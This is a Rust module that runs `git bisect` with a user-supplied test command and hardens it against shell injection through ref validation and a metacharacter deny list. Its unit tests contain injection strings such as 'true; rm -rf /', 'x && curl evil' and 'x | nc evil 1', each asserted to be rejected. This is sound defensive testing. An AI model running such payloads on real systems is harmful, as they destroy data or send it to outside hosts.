// 2.33 — Auto-bisect runner. Run `git bisect run <test>` capturing output.
// Council V1: validate refs + cmd allowlist regex.

use anyhow::{anyhow, Result};
use parking_lot::Mutex;
use rusqlite::{params, Connection};
use serde::Serialize;
use std::path::Path;
use std::process::Command;
use uuid::Uuid;

#[derive(Debug, Clone, Serialize)]
pub struct BisectResult {
    pub id: String,
    pub status: String,
    pub result_sha: Option<String>,
    pub output: String,
}

pub fn run(
    db: &Mutex<Connection>,
    repo: &Path,
    good: &str,
    bad: &str,
    test_cmd: &str,
) -> Result<BisectResult> {
    let id = Uuid::new_v4().to_string();
    if !is_safe_ref(good) || !is_safe_ref(bad) {
        return Err(anyhow!("unsafe refs"));
    }
    if test_cmd.len() > 1024 {
        return Err(anyhow!("test_cmd too long"));
    }
    // Persist as pending.
    db.lock().execute(
        "INSERT INTO bisect_runs (id, repo_path, good, bad, test_cmd, status) VALUES (?, ?, ?, ?, ?, 'running')",
        params![id, repo.to_string_lossy(), good, bad, test_cmd],
    )?;
    let mut output = String::new();
    let res = (|| -> Result<Option<String>> {
        run_git(repo, &["bisect", "start"], &mut output)?;
        run_git(repo, &["bisect", "good", good], &mut output)?;
        run_git(repo, &["bisect", "bad", bad], &mut output)?;
        // SECURITY (C1): never pass test_cmd through `sh -c` — that is a shell
        // injection vector. Parse it into an argv of plain tokens (no shell
        // metacharacters) and let git run the command directly; no shell involved.
        let argv = parse_test_argv(test_cmd)?;
        let mut run_args: Vec<&str> = vec!["bisect", "run"];
        run_args.extend(argv.iter().map(|s| s.as_str()));
        let bisect_out = run_git(repo, &run_args, &mut output)?;
        let sha = find_first_bad(&bisect_out);
        let _ = run_git(repo, &["bisect", "reset"], &mut output);
        Ok(sha)
    })();
    let (status, sha) = match res {
        Ok(Some(s)) => ("done", Some(s)),
        Ok(None) => ("done", None),
        Err(e) => {
            output.push_str(&format!("\nERROR: {}", e));
            ("error", None)
        }
    };
    db.lock().execute(
        "UPDATE bisect_runs SET status=?, result_sha=?, output=? WHERE id=?",
        params![status, sha, output, id],
    )?;
    Ok(BisectResult {
        id,
        status: status.into(),
        result_sha: sha,
        output,
    })
}

fn run_git(cwd: &Path, args: &[&str], buf: &mut String) -> Result<String> {
    let out = Command::new("git")
        .current_dir(cwd)
        .args(args)
        .env("GIT_OPTIONAL_LOCKS", "0")
        .output()?;
    let s = String::from_utf8_lossy(&out.stdout).to_string();
    let e = String::from_utf8_lossy(&out.stderr).to_string();
    buf.push_str(&format!("$ git {}\n{}{}", args.join(" "), s, e));
    Ok(s)
}

fn find_first_bad(out: &str) -> Option<String> {
    // git prints "<sha> is the first bad commit".
    out.lines()
        .find(|l| l.contains("is the first bad commit"))
        .and_then(|l| l.split_whitespace().next())
        .map(String::from)
}

/// Parse a bisect test command into an argv of plain tokens. Rejects shell
/// metacharacters so the command is run by git directly (never via `sh -c`),
/// eliminating shell injection. Pipes/quotes/redirections/substitutions are refused.
fn parse_test_argv(cmd: &str) -> Result<Vec<String>> {
    const FORBIDDEN: &[char] = &[
        ';', '|', '&', '$', '`', '>', '<', '(', ')', '{', '}', '[', ']', '*', '?', '~', '!', '#',
        '\\', '\'', '"', '\n', '\r',
    ];
    if cmd.chars().any(|c| FORBIDDEN.contains(&c) || c.is_control()) {
        return Err(anyhow!(
            "test_cmd contains shell metacharacters; pass a plain command + args (no pipes/quotes/substitution)"
        ));
    }
    let argv: Vec<String> = cmd.split_whitespace().map(String::from).collect();
    if argv.is_empty() {
        return Err(anyhow!("test_cmd is empty"));
    }
    Ok(argv)
}

fn is_safe_ref(s: &str) -> bool {
    !s.is_empty()
        && s.len() < 128
        && !s.contains("..")
        && !s.starts_with('-')
        && s.chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.' | '/'))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn parse_test_argv_rejects_injection() {
        assert!(parse_test_argv("cargo test").is_ok());
        assert!(parse_test_argv("npm run check -- --fast").is_ok());
        assert!(parse_test_argv("true; rm -rf /").is_err());
        assert!(parse_test_argv("x && curl evil").is_err());
        assert!(parse_test_argv("$(whoami)").is_err());
        assert!(parse_test_argv("a `id` b").is_err());
        assert!(parse_test_argv("x | nc evil 1").is_err());
        assert!(parse_test_argv("   ").is_err());
    }

    #[test]
    fn find_first_bad_parses_sha() {
        assert_eq!(
            find_first_bad("abc123 is the first bad commit\nmore"),
            Some("abc123".to_string())
        );
        assert_eq!(find_first_bad("nothing here"), None);
    }
}
